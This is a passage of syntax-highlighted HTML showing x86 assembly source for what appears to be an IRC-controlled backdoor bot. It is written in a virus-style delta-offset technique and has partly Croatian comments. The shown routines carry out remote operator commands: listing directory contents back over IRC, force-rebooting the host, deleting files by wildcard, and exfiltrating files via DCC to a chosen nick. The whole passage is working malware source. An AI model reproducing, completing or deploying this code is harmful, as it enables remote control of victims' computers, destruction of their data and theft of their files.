</span><span class="sc5">lsdelta</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">_LS</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;-</span><span class="sc5">lsdelta</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]&gt;</span><span class="sc0">         
            
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
            
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">; TOS = ptr to message</span><span class="sc0">
            </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PRIVMSG</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">irc_cmd_nick</span><span class="sc0"> </span><span class="sc5">_LS</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endsz</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">": "</span><span class="sc0">
            </span><span class="sc6">stosw</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wfd</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">wildcard</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_FindFirstFileA</span><span class="sc0"> </span><span class="sc5">_LS</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__err</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> 
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">search_handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">__bot_ls_loop</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wfd.WFD_szFileName</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CRLF_HEX</span><span class="sc0">
            </span><span class="sc6">stosw</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">IRC_LOG</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">bot_log_handle</span><span class="sc0"> </span><span class="sc5">_LS</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_WriteFile</span><span class="sc0"> </span><span class="sc5">_LS</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; IRC_LOG</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">socket_handle</span><span class="sc0"> </span><span class="sc5">_LS</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_send</span><span class="sc0"> </span><span class="sc5">_LS</span><span class="sc0">
            
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">

            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__err</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__err</span><span class="sc0">
            
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1500</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_Sleep</span><span class="sc0"> </span><span class="sc5">_LS</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wfd</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">search_handle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_FindNextFileA</span><span class="sc0"> </span><span class="sc5">_LS</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__bot_ls_loop</span><span class="sc0">

</span><span class="sc5">__err</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">__dcc_ls_thread_end</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">search_handle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_FindClose</span><span class="sc0"> </span><span class="sc5">_LS</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">free</span><span class="sc0">

            </span><span class="sc6">leave</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ExitThread</span><span class="sc0"> </span><span class="sc5">_LS</span><span class="sc0">
            
</span><span class="sc5">bot_ls_thread</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; reboot the computer</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_reboot</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">EWX_REBOOT</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">EWX_FORCE</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">ExitWindowsEx</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">EWX_FORCE</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">ExitWindowsEx</span><span class="sc0">

            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; deletes a file, wildcards supported</span><span class="sc0">
</span><span class="sc1">; format: !del &lt;file&gt;</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_del</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">patchcr</span><span class="sc0">
            
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">FindFirstFileA</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__err</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">__cycle</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">DeleteFileA</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__err</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">FindNextFileA</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__err</span><span class="sc0">
            
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cycle</span><span class="sc0">

</span><span class="sc5">__err</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">FindClose</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">free</span><span class="sc0">

            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; sends file via dcc</span><span class="sc0">
</span><span class="sc1">; format: !send &lt;nick&gt; &lt;file&gt;</span><span class="sc0">
</span><span class="sc1">; napomena: zadani fajl mora biti 8.3 i mora biti u trenutnom direktoriju </span><span class="sc0">
</span><span class="sc1">; (pogledajte !pwd naredbu). </span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_cmd_send</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">patchcr</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; param</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bot_sending_thread</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2000h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CreateThread</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">

            </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc5">bot_sending_thread</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">pascal</span><span class="sc0">

            </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">dcc_nick_file</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">arg_end</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">bytes_to_send</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">ssocket</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">port</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">dcc_msg</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">f_handle</span><span class="sc0">
            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">arg_start</span><span class="sc0">
            
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">arg_start</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">arg_end</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">sendlta</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc5">_ST</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;-</span><span class="sc5">sendlta</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]&gt;</span><span class="sc0"> 

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">malloc</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dcc_msg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">PRIVMSG</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dcc_nick_file</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endspc</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">": "</span><span class="sc0">
            </span><span class="sc6">stosw</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_READ</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CreateFileA</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end_dcc</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">f_handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_GetFileSize</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">bytes_to_send</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SOCK_STREAM</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">AF_INET</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_socket</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end_dcc</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">ssocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_GetTickCount</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">29ah</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4000</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">port</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_htons</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">type</span><span class="sc0"> </span><span class="sc5">sockaddr_in</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ssocket</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_bind</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
